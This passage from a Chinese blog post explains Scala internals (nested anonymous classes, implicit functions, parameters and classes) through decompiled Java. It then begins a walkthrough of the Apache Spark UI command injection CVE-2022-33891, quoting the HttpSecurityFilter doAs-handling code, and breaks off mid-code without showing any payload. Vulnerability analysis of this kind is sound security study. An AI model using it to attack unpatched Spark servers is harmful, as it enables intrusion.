<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//decompiled from AnonymousNested.class</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@ScalaSignature(</span></span><br><span class="line"><span class="meta">   bytes = &quot;ignored&quot;</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">AnonymousNested</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> &#123;</span><br><span class="line">      AnonymousNested$.MODULE$.main(args);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//decompiled from AnonymousNested$.class</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">AnonymousNested$</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> AnonymousNested$ MODULE$;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">static</span> &#123;</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">AnonymousNested$</span>();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> Method reflMethod$Method1(<span class="keyword">final</span> Class x$<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="type">StructuralCallSite</span> <span class="variable">methodCache1</span> <span class="operator">=</span> apply&lt;invokedynamic&gt;();</span><br><span class="line">      <span class="type">Method</span> <span class="variable">method1</span> <span class="operator">=</span> methodCache1.find(x$<span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (method1 != <span class="literal">null</span>) &#123;</span><br><span class="line">         <span class="keyword">return</span> method1;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         method1 = .MODULE$.ensureAccessible(x$<span class="number">1.</span>getMethod(<span class="string">&quot;printHelloNested&quot;</span>, methodCache1.parameterTypes()));</span><br><span class="line">         methodCache1.add(x$<span class="number">1</span>, method1);</span><br><span class="line">         <span class="keyword">return</span> method1;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> Method reflMethod$Method2(<span class="keyword">final</span> Class x$<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="type">StructuralCallSite</span> <span class="variable">methodCache2</span> <span class="operator">=</span> apply&lt;invokedynamic&gt;();</span><br><span class="line">      <span class="type">Method</span> <span class="variable">method2</span> <span class="operator">=</span> methodCache2.find(x$<span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (method2 != <span class="literal">null</span>) &#123;</span><br><span class="line">         <span class="keyword">return</span> method2;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         method2 = .MODULE$.ensureAccessible(x$<span class="number">1.</span>getMethod(<span class="string">&quot;b&quot;</span>, methodCache2.parameterTypes()));</span><br><span class="line">         methodCache2.add(x$<span class="number">1</span>, method2);</span><br><span class="line">         <span class="keyword">return</span> method2;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> &#123;</span><br><span class="line">      <span class="type">Object</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>() &#123;</span><br><span class="line">         <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>(<span class="built_in">this</span>) &#123;</span><br><span class="line">            <span class="comment">// $FF: synthetic field</span></span><br><span class="line">            <span class="keyword">private</span> <span class="keyword">final</span> &lt;undefinedtype&gt; $outer;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printHelloNested</span><span class="params">()</span> &#123;</span><br><span class="line">               <span class="built_in">this</span>.$outer.printHello();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> &#123;</span><br><span class="line">               <span class="keyword">if</span> ($outer == <span class="literal">null</span>) &#123;</span><br><span class="line">                  <span class="keyword">throw</span> <span class="literal">null</span>;</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                  <span class="built_in">this</span>.$outer = $outer;</span><br><span class="line">               &#125;</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">public</span> Object <span class="title function_">b</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.b;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printHello</span><span class="params">()</span> &#123;</span><br><span class="line">            scala.Predef..MODULE$.println(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;;</span><br><span class="line">      <span class="type">Object</span> <span class="variable">qual2</span> <span class="operator">=</span> a;</span><br><span class="line"></span><br><span class="line">      Object var10000;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         var10000 = reflMethod$Method2(qual2.getClass()).invoke(qual2);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (InvocationTargetException var8) &#123;</span><br><span class="line">         <span class="keyword">throw</span> var8.getCause();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="type">Object</span> <span class="variable">qual1</span> <span class="operator">=</span> var10000;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         reflMethod$Method1(qual1.getClass()).invoke(qual1);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (InvocationTargetException var7) &#123;</span><br><span class="line">         <span class="keyword">throw</span> var7.getCause();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="type">BoxedUnit</span> <span class="variable">var9</span> <span class="operator">=</span> BoxedUnit.UNIT;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> AnonymousNested$() &#123;</span><br><span class="line">      MODULE$ = <span class="built_in">this</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>main</code>方法中嵌套匿名类b调用外部类a将借助辅助变量<code>$outer</code>，<code>$outer</code>即表示当前类的外部类，即便它没有别显式地赋值。</p>
<h3 id="隐式转换"><a href="#隐式转换" class="headerlink" title="隐式转换"></a>隐式转换</h3><p>在<code>Java</code>中，如果开发者需要实现类功能的增强，一般采用继承、代理甚至于使用动态插桩技术来实现，使用这些技术都需要显示地新增或者修改代码，从而提高了代码的耦合性。那么有没有一种更简洁且不具备侵入性的解决方案来实现这些要求呢？<code>Scala</code>为开发者提供了一种解决方案。<br>隐式转换允许开发者在不改变原有代码的情况下，对现有类型进行扩展或者提供额外的功能。隐式转换通常用于增强现有类的功能、为现有类提供类型转换或者为函数提供额外的参数等。</p>
<h4 id="隐式函数"><a href="#隐式函数" class="headerlink" title="隐式函数"></a>隐式函数</h4><p>看下面的例子</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> scala.language.implicitConversions</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">ImplicitTransform</span> </span>&#123;</span><br><span class="line">  <span class="keyword">implicit</span> <span class="function"><span class="keyword">def</span> <span class="title">H2D</span></span>(h: <span class="type">Human</span>): <span class="type">Dog</span> = <span class="keyword">new</span> <span class="type">Dog</span>(h);</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="keyword">var</span> h = <span class="keyword">new</span> <span class="type">Human</span>()</span><br><span class="line">    h.bark()</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">Human</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">Dog</span>(<span class="params">h: <span class="type">Human</span></span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">bark</span></span>(): <span class="type">Unit</span> = &#123;</span><br><span class="line">      println(<span class="string">&quot;你在狗叫什么&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>main</code>方法中，首先创建了<code>Human</code>的实例对象，然后调用其<code>bark</code>方法，而在<code>Human</code>类中却没有定义有<code>bark</code>方法，按照其他编程语言的逻辑此时将发生编译异常，而在Scala中却别有洞天，代码将成功执行。<br><img src="/archives/2a377379/image-2.png" alt="alt text"><br>这便是<code>Scala</code>隐式转换的魅力，在伴生对象<code>ImplicitTransform</code>中额外定义了一个隐式方法<code>H2D</code>,其负责将<code>Human</code>类型转换为<code>Dog</code>类型，这个过程是开发者不可见的，是隐藏着由编译器帮开发者完成的。在<code>Human</code>对象实例尝试调用不存在的<code>bark</code>方法时，会首先尝试寻找当前上下文中是否存在隐式转换函数而不是直接报错退出，若存在则判断转换后的结果是否存在<code>bark</code>方法，若存在则调用该<code>bark</code>方法。<br>将<code>Scala</code>代码反编译成<code>Java</code>后观察发现隐式调用变成了显式调用。  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//decompiled from ImplicitTransform.class</span></span><br><span class="line"><span class="meta">@ScalaSignature(</span></span><br><span class="line"><span class="meta">   bytes = &quot;ignored&quot;</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">ImplicitTransform</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> &#123;</span><br><span class="line">      ImplicitTransform$.MODULE$.main(args);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> Dog <span class="title function_">H2D</span><span class="params">(<span class="keyword">final</span> Human h)</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> ImplicitTransform$.MODULE$.H2D(h);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Dog</span> &#123;</span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">bark</span><span class="params">()</span> &#123;</span><br><span class="line">         .MODULE$.println(<span class="string">&quot;你在狗叫什么&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">public</span> <span class="title function_">Dog</span><span class="params">(<span class="keyword">final</span> Human h)</span> &#123;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Human</span> &#123;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//decompiled from ImplicitTransform$.class</span></span><br><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">ImplicitTransform$</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> ImplicitTransform$ MODULE$;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">static</span> &#123;</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">ImplicitTransform$</span>();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> ImplicitTransform.Dog <span class="title function_">H2D</span><span class="params">(<span class="keyword">final</span> ImplicitTransform.Human h)</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ImplicitTransform</span>.Dog(h);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> &#123;</span><br><span class="line">      ImplicitTransform.<span class="type">Human</span> <span class="variable">h</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ImplicitTransform</span>.Human();</span><br><span class="line">      <span class="built_in">this</span>.H2D(h).bark();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> ImplicitTransform$() &#123;</span><br><span class="line">      MODULE$ = <span class="built_in">this</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在上面提供的代码中，观察发现<code>main</code>方法首先调用了<code>H2D</code>方法显式得将<code>Human</code>对象转换为<code>Dog</code>对象，之后再调用<code>Dog</code>对象的<code>bark</code>方法，这个过程在<code>Java</code>代码中是显式的。  </p>
<h4 id="隐式参数"><a href="#隐式参数" class="headerlink" title="隐式参数"></a>隐式参数</h4><p>看下面的代码  </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">ImplicitParameter</span> </span>&#123;</span><br><span class="line">  <span class="keyword">implicit</span> <span class="keyword">var</span> k: <span class="type">Int</span> = <span class="number">20</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    println(add(<span class="number">10</span>))</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">add</span></span>(x: <span class="type">Int</span>)(<span class="keyword">implicit</span> y: <span class="type">Int</span>): <span class="type">Int</span> = &#123;</span><br><span class="line">    x + y</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有了前面隐式函数的珠玉在前，理解隐式参数也就不再困难。在<code>main</code>方法中调用<code>add(x)</code>方法，因为该方法并不存在，那么首先应该寻找含有隐式参数的方法调用，即<code>add(x: Int)(y: Int)</code>，其中<code>y: Int</code>为隐式参数，则在当前上下文中寻找<code>Int</code>类型的隐式参数，即<code>k</code>，故<code>add(20)</code>方法调用的结果为<code>30</code>。 需要注意的是，在同一作用域中，同一类型的隐式参数只能出现一次，否则将产生编译器编译异常。如下例的代码是不被允许的：  </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">ImplicitParameter</span> </span>&#123;</span><br><span class="line">  <span class="keyword">implicit</span> <span class="keyword">var</span> k: <span class="type">Int</span> = <span class="number">20</span></span><br><span class="line">  <span class="comment">// 隐式参数类型类型冲突</span></span><br><span class="line">  <span class="keyword">implicit</span> <span class="keyword">var</span> l: <span class="type">Int</span> = <span class="number">40</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    println(add(<span class="number">10</span>))</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">add</span></span>(x: <span class="type">Int</span>)(<span class="keyword">implicit</span> y: <span class="type">Int</span>): <span class="type">Int</span> = &#123;</span><br><span class="line">    x + y</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>反编译后的结果亦非常清晰  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//decompiled from ImplicitParameter.class</span></span><br><span class="line"><span class="meta">@ScalaSignature(</span></span><br><span class="line"><span class="meta">   bytes = &quot;ignored&quot;</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">ImplicitParameter</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="keyword">final</span> <span class="type">int</span> x, <span class="keyword">final</span> <span class="type">int</span> y)</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> ImplicitParameter$.MODULE$.add(x, y);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> &#123;</span><br><span class="line">      ImplicitParameter$.MODULE$.main(args);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> k_$eq(<span class="keyword">final</span> <span class="type">int</span> x$<span class="number">1</span>) &#123;</span><br><span class="line">      ImplicitParameter$.MODULE$.k_$eq(x$<span class="number">1</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">k</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> ImplicitParameter$.MODULE$.k();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//decompiled from ImplicitParameter$.class</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">ImplicitParameter$</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> ImplicitParameter$ MODULE$;</span><br><span class="line">   <span class="keyword">private</span> <span class="type">int</span> k;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">static</span> &#123;</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">ImplicitParameter$</span>();</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="comment">// 获取隐式参数</span></span><br><span class="line">   <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">k</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">this</span>.k;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> k_$eq(<span class="keyword">final</span> <span class="type">int</span> x$<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="built_in">this</span>.k = x$<span class="number">1</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> &#123;</span><br><span class="line">    <span class="comment">// 调用add方法</span></span><br><span class="line">      .MODULE$.println(BoxesRunTime.boxToInteger(<span class="built_in">this</span>.add(<span class="number">10</span>, <span class="built_in">this</span>.k())));</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="keyword">final</span> <span class="type">int</span> x, <span class="keyword">final</span> <span class="type">int</span> y)</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> x + y;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> ImplicitParameter$() &#123;</span><br><span class="line">      MODULE$ = <span class="built_in">this</span>;</span><br><span class="line">      <span class="comment">// 隐式参数赋值</span></span><br><span class="line">      <span class="built_in">this</span>.k = <span class="number">20</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="隐式类"><a href="#隐式类" class="headerlink" title="隐式类"></a>隐式类</h4><p>看下面的代码  </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> scala.annotation.tailrec</span><br><span class="line"><span class="keyword">import</span> scala.language.implicitConversions</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">ImplicitClass</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="number">4.</span>times(println(<span class="string">&quot;test&quot;</span>))</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">implicit</span> <span class="class"><span class="keyword">class</span> <span class="title">intWithTimes</span>(<span class="params">i: <span class="type">Int</span></span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">times</span></span>[<span class="type">A</span>](f: =&gt; <span class="type">A</span>): <span class="type">Unit</span> = &#123;</span><br><span class="line">      <span class="meta">@tailrec</span></span><br><span class="line">      <span class="function"><span class="keyword">def</span> <span class="title">loop</span></span>(c: <span class="type">Int</span>): <span class="type">Unit</span> = &#123;</span><br><span class="line">        <span class="keyword">if</span> (c &gt; <span class="number">0</span>) &#123;</span><br><span class="line">          f</span><br><span class="line">          loop(c - <span class="number">1</span>)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      loop(i)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>main</code>方法中使用了一个不太常用的方法<code>4.times</code>，如此偏门的语法时如何实现的呢？这就是<code>Scala</code>隐式类的魔法。<br>在<code>Scala</code>中没有<code>Java</code>中类似<code>int</code> 这一类基本数据类型，所有数据类型均是包装类型，即<code>4</code>这个整型字面量乃是<code>Int</code>类型的实例对象，那么<code>4.times()</code>就表示在<code>Int</code>的实例对象上调用<code>times</code>方法。在进行方法调用时，首先会搜索<code>Int</code>类是否定义了<code>times</code>方法，若没有则在当前作用域中搜索是否存在<code>Int</code>类型的隐式类型转换，若存在，则在目标类型中搜索<code>times</code>方法进行调用。<br>将上述代码的字节码反编译为<code>Java</code>代码后得到：  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//decompiled from ImplicitClass.class</span></span><br><span class="line"><span class="meta">@ScalaSignature(</span></span><br><span class="line"><span class="meta">   bytes = &quot;ignored&quot;</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">ImplicitClass</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> intWithTimes <span class="title function_">intWithTimes</span><span class="params">(<span class="keyword">final</span> <span class="type">int</span> i)</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> ImplicitClass$.MODULE$.intWithTimes(i);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> &#123;</span><br><span class="line">      ImplicitClass$.MODULE$.main(args);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">intWithTimes</span> &#123;</span><br><span class="line">      <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">times</span><span class="params">(<span class="keyword">final</span> Function0 f)</span> &#123;</span><br><span class="line">         <span class="built_in">this</span>.loop$<span class="number">1</span>(<span class="built_in">this</span>.i, f);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">void</span> loop$<span class="number">1</span>(<span class="keyword">final</span> <span class="type">int</span> c, <span class="keyword">final</span> Function0 f$<span class="number">1</span>) &#123;</span><br><span class="line">         <span class="keyword">while</span>(c &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            f$<span class="number">1.</span>apply();</span><br><span class="line">            --c;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         <span class="type">BoxedUnit</span> <span class="variable">var10000</span> <span class="operator">=</span> BoxedUnit.UNIT;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">public</span> <span class="title function_">intWithTimes</span><span class="params">(<span class="keyword">final</span> <span class="type">int</span> i)</span> &#123;</span><br><span class="line">         <span class="built_in">this</span>.i = i;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//decompiled from ImplicitClass$.class</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">ImplicitClass$</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> ImplicitClass$ MODULE$;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">static</span> &#123;</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">ImplicitClass$</span>();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.intWithTimes(<span class="number">4</span>).times(() -&gt; &#123;</span><br><span class="line">         .MODULE$.println(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">      &#125;);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> ImplicitClass.intWithTimes <span class="title function_">intWithTimes</span><span class="params">(<span class="keyword">final</span> <span class="type">int</span> i)</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ImplicitClass</span>.intWithTimes(i);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> ImplicitClass$() &#123;</span><br><span class="line">      MODULE$ = <span class="built_in">this</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// $FF: synthetic method</span></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> Object $deserializeLambda$(SerializedLambda var0) &#123;</span><br><span class="line">      <span class="keyword">return</span> var0.lambdaDeserialize&lt;invokedynamic&gt;(var0);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>可以看到调用逻辑与前两小节隐式参数与隐式方法如出一辙。</p>
<h2 id="漏洞举例"><a href="#漏洞举例" class="headerlink" title="漏洞举例"></a>漏洞举例</h2><h3 id="Apache-Spark-UI-远程命令注入（CVE-2022-33891）"><a href="#Apache-Spark-UI-远程命令注入（CVE-2022-33891）" class="headerlink" title="Apache Spark UI 远程命令注入（CVE-2022-33891）"></a>Apache Spark UI 远程命令注入（CVE-2022-33891）</h3><p><code>Apache Spark UI</code> 曾经被披露存在远程命令注入漏洞，该漏洞源于程序对用户权限模拟用户名参数处理不当。该漏洞较为简单，便直接在代码中通过注释进行解释说明。<br><em>HttpSecurityFilter</em>  </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">doFilter</span></span>(req: <span class="type">ServletRequest</span>, res: <span class="type">ServletResponse</span>, chain: <span class="type">FilterChain</span>): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="keyword">val</span> hreq = req.asInstanceOf[<span class="type">HttpServletRequest</span>]</span><br><span class="line">    <span class="keyword">val</span> hres = res.asInstanceOf[<span class="type">HttpServletResponse</span>]</span><br><span class="line">    hres.setHeader(<span class="string">&quot;Cache-Control&quot;</span>, <span class="string">&quot;no-cache, no-store, must-revalidate&quot;</span>)</span><br><span class="line">    <span class="comment">// 获取当前登录用户名</span></span><br><span class="line">    <span class="keyword">val</span> requestUser = hreq.getRemoteUser()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// The doAs parameter allows proxy servers (e.g. Knox) to impersonate other users. For</span></span><br><span class="line">    <span class="comment">// that to be allowed, the authenticated user needs to be an admin.</span></span><br><span class="line">    <span class="comment">// 获取doAs参数的值</span></span><br><span class="line">    <span class="keyword">val</span> effectiveUser = <span class="type">Option</span>(hreq.getParameter(<span class="string">&quot;doAs&quot;</span>))</span><br><span class="line">      .map &#123; proxy =&gt;</span><br><span class="line">      <span class="comment">// 检查doAs是否与当前登录用户相同，如不相同且当前用户不具有管理员权限则退出</span></span><br><span class="line">        <span class="keyword">if</span> (requestUser != proxy &amp;&amp; !securityMgr.checkAdminPermissions(requestUser)) &#123;</span><br><span class="line">          hres.sendError(<span class="type">HttpServletResponse</span>.<span class="type">SC_FORBIDDEN</span>,</span><br><span class="line">            <span class="string">s&quot;User <span class="subst">$requestUser</span> is not allowed to impersonate others.&quot;</span>)</span><br><span class="line">          <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        proxy</span><br><span class="line">      &#125;</span><br><span class="line">      .getOrElse(requestUser)</span><br><span class="line">    <span class="comment">// 检查代理用户是否具有UIView权限</span></span><br><span class="line">    <span class="keyword">if</span> (!securityMgr.checkUIViewPermissions(effectiveUser)) &#123;</span><br><span class="line">      hres.sendError(<span class="type">HttpServletResponse</span>.<span class="type">SC_FORBIDDEN</span>,</span><br><span class="line">        <span class="string">s&quot;User 